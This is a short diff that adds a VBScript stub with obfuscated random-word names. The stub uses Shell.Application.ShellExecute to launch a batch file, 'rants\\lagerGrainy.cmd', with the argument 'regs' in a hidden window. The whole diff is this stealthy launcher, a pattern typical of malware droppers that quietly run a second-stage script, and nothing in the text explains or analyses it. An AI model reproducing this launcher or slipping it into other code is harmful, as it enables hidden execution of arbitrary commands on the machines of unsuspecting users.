@@ -1,0 +1,4 @@
+' decennialHayrack
+acquiesceUnhitched = "regs"
+Set outclassesOverproduced = CreateObject("shell.application")
+outclassesOverproduced.shellexecute "rants\\lagerGrainy.cmd", acquiesceUnhitched, "", "open", 0
